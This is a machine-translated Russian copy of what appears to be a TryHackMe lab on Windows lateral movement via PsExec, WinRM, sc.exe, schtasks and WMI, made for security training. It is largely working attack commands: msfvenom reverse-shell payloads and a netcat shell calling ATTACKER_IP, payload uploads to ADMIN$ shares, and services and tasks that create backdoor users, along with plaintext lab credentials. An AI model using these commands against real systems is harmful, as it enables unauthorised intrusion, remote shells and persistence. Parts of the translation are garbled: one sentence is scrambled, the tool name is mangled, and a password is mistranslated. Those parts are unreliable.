В этой задаче будут рассмотрены доступные методы, которые злоумышленник может использовать для удаленного запуска процесса, что позволит ему запускать команды на компьютерах, где у него есть действительные учетные данные. Каждый из обсуждаемых методов использует несколько разные способы достижения одной и той же цели, и некоторые из них могут лучше подходить для некоторых конкретных сценариев. 

Псекек 
    • Порты: 445/ TCP ( SMB ) 
    • Требуемое членство в группе: администраторы 
Psexec уже много лет используется при необходимости удаленного выполнения процессов. Он позволяет пользователю-администратору удаленно запускать команды на любом компьютере, к которому у него есть доступ. Psexec — один из многих инструментов Sysinternals, его можно скачать здесь . 
Psexec работает следующим образом: 
    1. Подключитесь к общему ресурсу Admin$ и загрузите двоичный файл службы. Psexec использует в качестве имени psexesvc.exe. 
    2. Подключитесь к диспетчеру управления службами, чтобы создать и запустить службу с именем PSEXESVC, и свяжите двоичный файл службы с C:\Windows\psexesvc.exe. 
    3. Создайте несколько именованных каналов для обработки stdin/stdout/stderr. 

Чтобы запустить psexec, нам нужно только предоставить необходимые учетные данные администратора для удаленного хоста и команду, которую мы хотим запустить ( psexec64.exe доступен под C:\toolsв THMJMP2 для вашего удобства): 
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe

Удаленное создание процессов с использованием WinRM 
    • Порты: 5985/TCP (WinRM HTTP ) или 5986/ TCP (WinRM HTTPS). 
    • Требуемое членство в группах: пользователи удаленного управления 
Удаленное управление Windows (WinRM) — это веб-протокол, используемый для удаленной отправки команд Powershell на хосты Windows. В большинстве установок Windows Server WinRM включен по умолчанию, что делает его привлекательным вектором атаки. 
Чтобы подключиться к удаленному сеансу Powershell из командной строки, мы можем использовать следующую команду: 
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
Мы можем добиться того же с помощью Powershell, но для передачи других учетных данных нам нужно будет создать объект PSCredential: 
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Получив объект PSCredential, мы можем создать интерактивный сеанс с помощью командлета Enter-PSSession: 
Enter-PSSession -Computername TARGET -Credential $credential
Powershell также включает командлет Invoke-Command, который удаленно запускает ScriptBlocks через WinRM. Учетные данные также должны передаваться через объект PSCredential: 
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}

    Удаленное создание служб с помощью sc 
    
    • Порты: 
        ◦ 135/ TCP , 49152-65535/ TCP (DCE/RPC) 
        ◦ 445/ TCP (RPC через именованные каналы SMB ) 
        ◦ 139/ TCP (RPC через именованные каналы SMB ) 
    • Требуемое членство в группе: администраторы 
Службы Windows также можно использовать для запуска произвольных команд, поскольку они выполняют команду при запуске. Хотя исполняемый файл службы технически отличается от обычного приложения, если мы настроим службу Windows для запуска любого приложения, она все равно выполнит его и впоследствии выйдет из строя. 
Мы можем создать службу на удаленном хосте с помощью sc.exe — стандартного инструмента, доступного в Windows. При использовании sc он попытается подключиться к программе удаленного обслуживания Service Control Manager (SVCCTL) через RPC несколькими способами: 
    1. Будет предпринята попытка подключения с использованием DCE/RPC. Клиент сначала подключится к сопоставителю конечных точек (EPM) через порт 135, который служит каталогом доступных конечных точек RPC, и запросит информацию о сервисной программе SVCCTL. Затем EPM ответит IP-адресом и портом для подключения к SVCCTL, который обычно представляет собой динамический порт в диапазоне 49152–65535. 
       
    2. Если последнее соединение не удалось, sc попытается подключиться к SVCCTL через именованные каналы SMB либо через порт 445 ( SMB ), либо через порт 139 ( SMB через NetBIOS). 
       
Мы можем создать и запустить службу с именем «THMservice», используя следующие команды: 
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
Команда «net user» будет выполнена при запуске службы, создавая в системе нового локального пользователя. Поскольку за запуск службы отвечает операционная система, вы не сможете просмотреть вывод команды. 
Чтобы остановить и удалить службу, мы можем выполнить следующие команды: 
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice

    Удаленное создание запланированных задач 
    
Еще одна функция Windows, которую мы можем использовать, — это запланированные задачи. Вы можете создать и запустить его удаленно с помощью schtasks, доступного в любой установке Windows. Чтобы создать задачу с именем THMtask1, мы можем использовать следующие команды: 
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
Мы устанавливаем для типа расписания (/sc) значение ONCE, что означает, что задача предназначена для запуска только один раз в указанное время и дату. Поскольку мы будем запускать задачу вручную, дата начала (/sd) и время начала (/st) в любом случае не будут иметь большого значения. 
Поскольку система выполнит запланированное задание, выходные данные команды не будут нам доступны, что делает эту атаку слепой. 
Наконец, чтобы удалить запланированное задание, мы можем использовать следующую команду и очистить за собой: 
schtasks /S TARGET /TN "THMtask1" /DELETE /F

Давай приступим к работе! 
Чтобы выполнить это упражнение, вам нужно будет подключиться к THMJMP2, используя учетные данные, назначенные вам в задаче 1, с http://distributor.za.tryhackme.com/creds . Если вы еще этого не сделали, нажмите на ссылку и получите учетные данные прямо сейчас. Получив учетные данные, подключитесь к THMJMP2 через SSH : 
ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
В этом упражнении мы предположим, что уже получили некоторые учетные данные с административным доступом: 
Пользователь: ZA.TRYHACKME.COM\t1_leonard.summers 
Пароль: EZpass4ever 
Мы покажем, как использовать эти учетные данные для бокового перехода к THMIIS, используя sc.exe. Не стесняйтесь пробовать другие методы, поскольку все они должны работать против THMIIS. 
Хотя мы уже показали, как использовать sc для создания пользователя в удаленной системе (с помощью net user), мы также можем загрузить любой двоичный файл, который хотим выполнить, и связать его с созданным сервисом. Однако если мы попытаемся запустить обратную оболочку с помощью этого метода, мы заметим, что обратная оболочка отключается сразу после выполнения. Причина этого в том, что исполняемые файлы служб отличаются от стандартных файлов .exe, и поэтому исполняемые файлы, не являющиеся службами, в конечном итоге будут уничтожены менеджером служб почти сразу. К счастью для нас, msfvenom поддерживает exe-serviceформат, который будет инкапсулировать любую полезную нагрузку, которая нам нравится, внутри полнофункционального исполняемого файла службы, предотвращая ее уничтожение. 
Чтобы создать обратную оболочку, мы можем использовать следующую команду: 
Примечание. Поскольку вы будете использовать лабораторную работу совместно с другими, вам нужно будет использовать другое имя файла для своих полезных данных вместо «myservice.exe», чтобы избежать перезаписи чужих полезных данных. 
АтакаБокс 
user@AttackBox$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
        
Затем мы продолжим использовать учетные данные t1_leonard.summers для загрузки нашей полезной нагрузки в долю ADMIN$ THMIIS с помощью smbclient из нашего AttackBox: 
АтакаБокс 
user@AttackBox$ smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
 putting file myservice.exe as \myservice.exe (0.0 kb/s) (average 0.0 kb/s)
        
Как только наш исполняемый файл будет загружен, мы настроим прослушиватель на машине злоумышленника для получения обратной оболочки от msfconsole: 
АтакаБокс 
user@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4444
        
Альтернативно вы можете запустить следующую однострочную команду на консоли Linux , чтобы сделать то же самое: 
АтакаБокс 
user@AttackBox$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
        
С sc.exeне позволяет нам указывать учетные данные как часть команды, нам нужно использовать runasдля создания новой оболочки с токеном доступа t1_leonard.summer. только по SSH , поэтому, если мы попробуем что-то вроде Тем не менее, у нас есть доступ к машине runas /netonly /user:ZA\t1_leonard.summers cmd.exe, новая командная строка появится в сеансе пользователя, но у нас не будет к ней доступа. Чтобы решить эту проблему, мы можем использовать runas для создания второй обратной оболочки с токеном доступа t1_leonard.summers: 
THMJMP2: Командная строка 
C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
        
Примечание. Помните, что, поскольку вы используете runasс /netonlyвариант, он не будет проверять правильность предоставленных учетных данных (более подробную информацию об этом можно найти в «Перечисление AD» разделе ), поэтому обязательно вводите пароль правильно. Если вы этого не сделаете, позже в комнате вы увидите несколько ошибок «ДОСТУП ЗАПРЕЩЕН». 
Мы можем получить обратное соединение оболочки, используя nc в нашем AttackBox, как обычно: 
АтакаБокс 
user@AttackBox$ nc -lvp 4443
        

И, наконец, приступим к удаленному созданию нового сервиса с помощью sc, связав его с нашим загруженным двоичным файлом: 
THMJMP2: Командная строка (как t1_leonard.summers) 
C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
        
Обязательно измените название своей службы, чтобы избежать конфликтов с другими студентами. 
После запуска службы вы должны получить соединение в AttackBox, откуда вы сможете получить доступ к первому флагу на рабочем столе t1_leonard.summers. 
Ответить на вопросы ниже 
Какой флаг будет установлен после запуска файла flag.exe на рабочем столе t1_leonard.summers в THMIIS? 




Мы также можем по-другому реализовать многие методы, описанные в предыдущей задаче, с помощью инструментария управления Windows ( WMI ). WMI — это реализация Windows системы управления предприятием через веб-интерфейс (WBEM), корпоративного стандарта для доступа к информации управления на разных устройствах. 
Проще говоря, WMI позволяет администраторам выполнять стандартные задачи управления, которыми злоумышленники могут злоупотреблять для выполнения бокового перемещения различными способами, о которых мы и поговорим. 

    Подключение к WMI из Powershell 
    
Прежде чем мы сможем подключиться к WMI с помощью команд Powershell, нам необходимо создать объект PSCredential с нашим пользователем и паролем. Этот объект будет храниться в переменной $credential и использоваться во всех методах этой задачи: 
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Затем мы приступаем к установлению сеанса WMI, используя любой из следующих протоколов: 
    • DCOM: для подключения к WMI будет использоваться RPC over IP. Этот протокол использует порт 135/ TCP и порты 49152-65535/ TCP , как описано при использовании sc.exe. 
    • Wsman: WinRM будет использоваться для подключения к WMI. Этот протокол использует порты 5985/TCP (WinRM HTTP ) или 5986/ TCP (WinRM HTTPS). 
Чтобы установить сеанс WMI из Powershell, мы можем использовать следующие команды и сохранить сеанс в переменной $Session, которую мы будем использовать в комнате различными методами: 
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
The New-CimSessionOptionКомандлет используется для настройки параметров подключения для сеанса WMI , включая протокол подключения. Затем параметры и учетные данные передаются в New-CimSessionкомандлет для установления сеанса с удаленным хостом. 

Создание удаленного процесса с использованием WMI 
    • Порты: 
        ◦ 135/ ПТС , 49152-65535/ ПТС (ДЦЕРПК) 
        ◦ 5985/TCP (WinRM HTTP ) или 5986/ TCP (WinRM HTTPS) 
    • Требуемое членство в группе: администраторы 
Мы можем удаленно запустить процесс из Powershell, используя инструментарий управления Windows ( WMI ), отправив запрос WMI классу Win32_Process для запуска процесса в сеансе, который мы создали ранее: 
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
Обратите внимание, что WMI не позволит вам увидеть вывод какой-либо команды, но действительно создаст необходимый процесс в автоматическом режиме. 
В устаревших системах то же самое можно сделать с помощью wmic из командной строки: 
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 

Удаленное создание служб с помощью WMI 
    • Порты: 
        ◦ 135/ ПТС , 49152-65535/ ПТС (ДЦЕРПК) 
        ◦ 5985/TCP (WinRM HTTP ) или 5986/ TCP (WinRM HTTPS) 
    • Требуемое членство в группе: администраторы 
Мы можем создавать сервисы с WMI через Powershell. Чтобы создать службу THMService2, мы можем использовать следующую команду: 
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
Затем мы можем получить дескриптор службы и запустить ее с помощью следующих команд: 
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
Наконец, мы можем остановить и удалить службу с помощью следующих команд: 
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete

    Удаленное создание запланированных задач с помощью WMI 
    
    • Порты: 
        ◦ 135/ ПТС , 49152-65535/ ПТС (ДЦЕРПК) 
        ◦ 5985/TCP (WinRM HTTP ) или 5986/ TCP (WinRM HTTPS) 
    • Требуемое членство в группе: администраторы 
Мы можем создавать и выполнять запланированные задачи, используя некоторые командлеты, доступные в установках Windows по умолчанию: 
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
Чтобы удалить запланированное задание после его использования, мы можем использовать следующую команду: 
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"

    Установка пакетов MSI через WMI 
    
    • Порты: 
        ◦ 135/ ПТС , 49152-65535/ ПТС (ДЦЕРПК) 
        ◦ 5985/TCP (WinRM HTTP ) или 5986/ TCP (WinRM HTTPS) 
    • Требуемое членство в группе: администраторы 
MSI — это формат файла, используемый установщиками. Если мы сможем скопировать пакет MSI в целевую систему, мы сможем затем использовать WMI, чтобы попытаться установить его для нас. Файл можно скопировать любым доступным злоумышленнику способом. Как только файл MSI окажется в целевой системе, мы можем попытаться установить его, вызвав класс Win32_Product через WMI : 
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
Мы можем добиться того же, используя wmic в устаревших системах: 
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi

Давай приступим к работе! 
Чтобы выполнить это упражнение, вам нужно будет подключиться к THMJMP2, используя учетные данные, назначенные вам для выполнения задачи 1, с http://distributor.za.tryhackme.com/creds . Если вы еще этого не сделали, нажмите на ссылку и получите учетные данные. Получив учетные данные, подключитесь к THMJMP2 через SSH : 
ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
В этом упражнении мы предположим, что уже получили некоторые учетные данные с административным доступом: 
Пользователь: ZA.TRYHACKME.COM\t1_corine.waters 
Пароль: Корина.1994 г. 
Мы покажем, как использовать эти учетные данные для перехода на THM-IIS с помощью пакетов WMI и MSI. Не стесняйтесь попробовать другие методы, представленные в этом задании. 
Мы начнем с создания полезной нагрузки MSI с помощью msfvenom с нашей машины злоумышленника: 
Примечание. Поскольку вы будете использовать лабораторную работу совместно с другими, вам нужно будет использовать другое имя файла для своих полезных данных вместо «myinstaller.msi», чтобы избежать перезаписи чужих полезных данных. 
АтакаБокс 
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
        
Затем мы копируем полезную нагрузку, используя SMB или любой другой доступный метод: 
АтакаБокс 
user@AttackBox$ smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
 putting file myinstaller.msi as \myinstaller.msi (0.0 kb/s) (average 0.0 kb/s)
        
Поскольку мы скопировали нашу полезную нагрузку в общий ресурс ADMIN$, она будет доступна в C:\Windows\ на сервере. 
Запускаем обработчик для получения обратного шелла от Metasploit : 
АтакаБокс 
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4445
        
Давайте начнем сеанс WMI с THMIIS из консоли Powershell: 
THMJMP2: Powershell 
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
        
Затем мы вызываем метод Install из класса Win32_Product, чтобы активировать полезную нагрузку: 
THMJMP2: Powershell 
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
        
В результате вы должны получить соединение в AttackBox, откуда вы сможете получить доступ к флагу на рабочем столе t1_corine.waters. 




